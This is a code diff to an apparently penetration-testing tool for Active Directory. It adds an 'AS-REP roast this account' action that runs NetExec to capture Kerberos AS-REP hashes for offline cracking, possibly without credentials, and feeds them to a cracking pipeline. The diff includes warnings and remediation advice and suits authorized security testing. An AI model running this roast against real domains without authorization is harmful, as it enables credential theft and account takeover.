@@ -23,7 +23,7 @@ from typing import Callable, Optional
 
 from .engines import CertipyEngine, LdapEngine, NetExecEngine, TLSEngine
 from .engines.base import Engine, Target
-from .engines.ldap import parse_kerberoast
+from .engines.ldap import parse_asrep, parse_kerberoast
 from .events import Event, EventBus, EventKind
 from .findings import Category, Evidence, Finding, Report, Severity
 from .scan import _emit_finding_graph
@@ -287,6 +287,73 @@ def execute_armed_action(action_id: str, target: str, tgt: Target, *,
 ACTIONS["kerberoast-user"] = Action(
     "kerberoast-user", "Kerberoast this account", ("user",),
     offensive=True, handler=_kerberoast_user)
+
+
+# --------------------------------------------------------------------------- #
+# AS-REP roast one principal (sibling of kerberoast; needs no credentials)      #
+# --------------------------------------------------------------------------- #
+def _default_asrep_run(tgt: Target) -> str:
+    """AS-REP roast via `nxc ldap --asreproast`, reusing LdapEngine's invocation + nxc's hash file.
+
+    VERIFY on Kali: unlike Kerberoast, AS-REP roasting a KNOWN account can succeed
+    unauthenticated - this runs with whatever creds `tgt` carries (possibly none); confirm the
+    `--asreproast` behavior with empty creds against real nxc.
+    """
+    eng = LdapEngine()
+    if not eng.is_available():
+        return ""
+    with tempfile.TemporaryDirectory() as td:
+        out = os.path.join(td, "asrep.txt")
+        raw = eng._invoke(["--asreproast", out], tgt)
+        for f in glob.glob(os.path.join(td, "*.txt")):
+            try:
+                with open(f, encoding="utf-8", errors="replace") as fh:
+                    raw += "\n" + fh.read()
+            except OSError:
+                pass
+    return raw
+
+
+def _asrep_warn(target: str) -> str:
+    return (f"Requests the AS-REP hash for '{target}' for offline cracking. Low intrusiveness and "
+            f"needs no credentials; a recovered password is a valid domain credential.")
+
+
+def _asrep_roast(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
+                 runner: Optional[Callable[[Target], str]] = None) -> list[Finding]:
+    """AS-REP roast one principal: capture its krb5asrep hash for offline cracking.
+
+    Reuses ldap.parse_asrep; the hash rides in meta["hashes"] for the crack pipeline. The roast
+    runs LIVE here at execution time (no cached scan result) for fresh accuracy.
+    """
+    raw = (runner or _default_asrep_run)(tgt)
+    pairs = [(a, h) for a, h in parse_asrep(raw) if _principal(a) == _principal(target)]
+    if not pairs:
+        return []
+    return [Finding(
+        id="asrep-roast-user",
+        title=f"AS-REP roasted {target}",
+        severity=Severity.HIGH,
+        category=Category.KERBEROS,
+        description=f"Captured the AS-REP hash for '{target}' (Kerberos pre-authentication "
+                    f"disabled) for offline cracking.",
+        impact="The AS-REP hash can be cracked offline with no credentials; a recovered password "
+               "is a valid domain credential.",
+        remediation="Enable Kerberos pre-authentication for the account; enforce a strong, long "
+                    "password.",
+        affected=[target],
+        evidence=[Evidence(source="netexec-ldap",
+                           detail=f"{len(pairs)} krb5asrep hash(es) for {target}")],
+        references=["https://attack.mitre.org/techniques/T1558/004/"],
+        credentialed=False,
+        meta={"offensive": True, "action": "asrep-roast",
+              "hashes": [{"account": a, "hash": h, "type": "krb5asrep"} for a, h in pairs]},
+    )]
+
+
+ACTIONS["asrep-roast"] = Action(
+    "asrep-roast", "AS-REP roast this account", ("user",),
+    offensive=True, handler=_asrep_roast, warn=_asrep_warn)
 
 
 # --------------------------------------------------------------------------- #
